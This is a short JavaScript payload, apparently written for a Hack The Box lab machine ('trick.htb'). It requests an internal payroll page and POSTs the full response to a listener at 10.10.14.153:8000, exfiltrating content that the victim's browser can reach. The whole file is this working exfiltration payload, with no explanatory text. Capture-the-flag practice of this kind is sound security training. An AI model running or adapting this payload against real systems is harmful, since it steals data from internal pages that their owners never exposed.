var target = "http://preprod-payroll.trick.htb/";
var req1 = new XMLHttpRequest(); 
req1.open('GET', target, false);
req1.send();
var response = req1.responseText;

var req2 = new XMLHttpRequest(); 
req2.open('POST', "http://10.10.14.153:8000/" , false);
req2.send(response);

